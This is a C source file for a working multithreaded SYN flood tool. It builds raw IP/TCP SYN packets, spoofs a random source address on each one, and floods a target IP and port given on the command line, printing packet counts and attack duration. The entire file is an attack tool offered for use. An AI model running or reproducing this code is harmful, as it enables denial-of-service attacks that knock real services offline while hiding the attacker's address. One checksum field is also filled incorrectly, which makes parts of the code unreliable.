#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp_var.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include "src/tanitim.c"
#include "src/random-ip-macARM.c"

#define KRMZ   "\x1B[31m"
#define YSL   "\x1B[32m"
#define SR   "\x1B[33m"
#define MV   "\x1B[34m"
#define RESET "\x1B[0m"

// Global variable definitions.
unsigned long p_num = 0;
pthread_mutex_t mut;
time_t start_time;

struct sozde_baslik{
    unsigned int kaynak_adres;
    unsigned int hedef_adres;
    unsigned char placeholder; //rezerve
    unsigned char protokol;
    unsigned short tcp_uzunlugu;
    struct tcphdr tcp;
};

// Newly created thread parameter structure
struct thread_info{
    int soket;
    char datagram[4096];
    struct ip *iph;
    struct sockaddr_in sin;
    struct sozde_baslik psh;
};

unsigned short csum(unsigned short *buf, int nbayt){
    unsigned long toplam;
    unsigned short oddbyte;
    unsigned short cevap;

    toplam = 0;

    while(nbayt > 1){
        toplam += *buf++;
        nbayt -= 2;
    } 

    if(nbayt == 1){
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char*)buf;
        toplam += oddbyte;
    }
    toplam = (toplam >> 16) + (toplam & 0xffff);
    toplam = toplam + (toplam >> 16);
    cevap = (short)~toplam;
    return(cevap);
}

void bilgi(){
        time_t end_time;
        double time_diff;
        time(&end_time);
        time_diff = difftime(end_time, start_time);
        printf("\n\n----------------------------------------------------------");
        printf("\n\nNumber of PACKETS: "YSL"%lu"RESET" \t Attack Time: "YSL"%.2f"RESET" second \n\n"RESET, p_num, time_diff);
        printf("----------------------------------------------------------\n\n");
        pthread_mutex_destroy(&mut);
        exit(1);
}

void *attack(void *arg){
    struct thread_info *attack_param = arg;
    signal(SIGINT, (void *)bilgi);
    while (1){ 
        //Send packets
        if (sendto (attack_param->soket,      // our socket 
                    attack_param->datagram,   // datagram includes data and headers
                    attack_param->iph->ip_len,    // total size of datagram, changed tot_len to ip_len
                    0,      // flag
                    (struct sockaddr *) &(attack_param->sin),   // socket address
                    sizeof (attack_param->sin)) < 0)       // normal send() 
        {
            exit(1);
        }
        //If packet sending successful
        else
        {
            // Critical section for packet numbers
            pthread_mutex_lock(&mut);
            p_num++;
            if(p_num == 1)
                printf(YSL"[+]"MV" Attack has been started!\n"RESET);
            pthread_mutex_unlock(&mut);
        }
        // Random IP generate and assign 
        char *str = random_ip();
        attack_param->psh.kaynak_adres = htons(atoi(str));
        attack_param->iph->ip_src.s_addr = inet_addr(str); // Changed saddr to ip_src.s_addr
        attack_param->iph->ip_id = htons(rand());  //Paketin ID'si, changed id to ip_id
        free(str);
    }
}


int main(int argc, char *argv[]){

    if(argc != 5){
        printf(SR"[!]"RESET" Please enter the commands correctly\n");
        printf(YSL"USAGE:"RESET"  %s <source port> <target IP> <target port> <threads number>\n", argv[0]);
        exit(0);
    }
    
    tanitim();
    
    struct thread_info th_param;                                               
    //Create raw socket
    th_param.soket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(th_param.soket == -1){
        printf (KRMZ"[-]"RESET" Create socket error! Error NO : %d . Error Message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    //Init datagram packet
    char source_ip[32];
    
    //IP header
    th_param.iph = (struct ip *) th_param.datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(th_param.datagram + sizeof(struct ip));
    
    th_param.sin.sin_family = AF_INET;
    th_param.sin.sin_port = htons(atoi(argv[1])); //Specify source port
    th_param.sin.sin_addr.s_addr = inet_addr(argv[2]); //Specify target IP

    memset(th_param.datagram, 0, 4096);  // Fill the buffer of datagram with 0

    //Set IP headers
    th_param.iph->ip_hl = 5;
    th_param.iph->ip_v = 4;
    th_param.iph->ip_tos = 0;
    th_param.iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr); // Changed tot_len to ip_len
    th_param.iph->ip_id = htons(rand()); // Packet ID
    th_param.iph->ip_off = 0;
    th_param.iph->ip_ttl = 255; // TTL = 255
    th_param.iph->ip_p = IPPROTO_TCP;
    th_param.iph->ip_sum = 0; // Set this before configure checksum
    th_param.iph->ip_dst.s_addr = th_param.sin.sin_addr.s_addr; // Assign target IP
    th_param.iph->ip_sum = csum((unsigned short *)th_param.datagram, th_param.iph->ip_len >> 1); // Changed tot_len to ip_len

    //TCP Header
    

    tcph->th_sport = htons(atoi(argv[1]));
    tcph->th_dport = htons(atoi(argv[3]));
    tcph->th_seq = 0;
    tcph->th_ack = 0;
    tcph->th_off = 5;  // data offset
    tcph->th_flags = TH_SYN; // SYN flag
    tcph->th_win = htons(5840); // max allowed window size
    tcph->th_sum = 0; // if you set checksum to 0, the kernel will compute it during sending
    tcph->th_urp = 0;
    
    th_param.psh.hedef_adres = th_param.sin.sin_addr.s_addr;
    th_param.psh.placeholder = 0;
    th_param.psh.protokol = IPPROTO_TCP;
    th_param.psh.tcp_uzunlugu = htons(20);

    memcpy(&(th_param.psh).tcp , tcph , sizeof (struct tcphdr));
    
    tcph->th_sum = csum((unsigned short *)&(th_param.psh), sizeof(struct sozde_baslik));
     
    //IP_HDRINCL kernele headerin pakete include edildigini soyler
    int one = 1;
    const int *val = &one;
    if (setsockopt (th_param.soket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf (KRMZ"[-]"RESET" IP_HDRINCL error! Error NO : %d . Error Message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    else{
        printf(YSL"[+] "RESET"IP_HDRINCL success!\n");
    }
    int thread_number = atoi(argv[4]);
    pthread_t thread[thread_number];
    pthread_mutex_init(&mut, NULL); // Init mutex 
    time(&start_time); // Start timer
    for(int i = 0; i < thread_number; i++){
        if(pthread_create(&thread[i], NULL, &attack, &th_param) != 0){
            printf(KRMZ"[-]"RESET" Failed the create THREADS!\n");
            exit(1);
        }
        else{
            if(i == thread_number - 1) // if all thread has started
                while(1)
                    sleep(1); // wait main thread.
        }
    } 
    return 0;
}
